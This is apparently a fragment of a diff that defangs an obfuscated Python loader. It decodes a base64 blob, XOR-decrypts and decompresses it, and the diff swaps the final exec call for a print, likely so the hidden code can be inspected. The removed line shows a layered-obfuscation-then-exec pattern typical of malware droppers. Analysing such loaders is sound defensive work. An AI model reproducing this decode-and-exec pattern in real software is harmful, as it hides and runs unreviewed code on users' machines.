@@ -24,4 +24,4 @@ payload = """Me2fWqku0XhE2d3Zclay+9FrL9Yn50mr3Gz5XV/9sQj6xt+MBkrvWABtIcX016SNgSv
 decoded = base64.b64decode(payload)
 decrypted = xor_crypt(decoded, XOR_KEY)
 decompressed = zlib.decompress(decrypted).decode('utf-8')
-exec(decompressed)
+print(decompressed) # exec
